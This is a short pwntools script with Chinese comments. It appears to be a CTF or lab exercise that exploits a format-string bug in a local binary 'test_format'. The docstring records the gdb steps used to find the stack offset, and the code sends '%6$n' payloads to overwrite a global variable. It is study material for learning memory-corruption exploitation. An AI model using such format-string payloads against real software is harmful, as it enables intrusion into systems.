"""
gdb$ disass Input # 查看Input函数中 printf地址 0x08048651 并下断点
gdb$ b* 0x08048651 # 断下后输出 esp, x/16wx $esp 数一下偏移为 7 格式化串占1个, 所以偏移为 7-1 = 6
0xffffd498  [0xffffd498  0x00000050  0xf7e73312  0xf7fbed60  0x00000000  0x61616161] # 前两个 0xffffd498 是参数地址。 格式化串占一个。所以偏移为6
* %6$n 来修改n的值 使变量n的值修改为int的字节数, 即n=4拿到权限
"""
from pwn import *

context(log_level='debug', arch='i386', os='linux')
context(log_level='debug', arch='amd64', os='linux')

e = ELF("./test_format")

n_addr = e.sym['n']
# s = process('./test_format')
s = gdb.debug('./test_format', 'b*0x08048651\nc')


def func1():
    payload = p32(n_addr) + b'%6$n'
    payload = p32(n_addr) + b'%5c%6$n'      # 前面4个字节是n的值, 后面5个字节是n的值, 5+4=9, 会写入9
    payload = p32(n_addr) + b'%300c%6$hhn'  # 300+4 - 256 = 0x30
    s.send(payload)


def func2():
    # fmtstr_payload 不能 gdb.attach, 看的效果不对
    payload = fmtstr_payload(6, {n_addr: 4})
    s.send(payload)


func1()
# func2()
s.interactive()
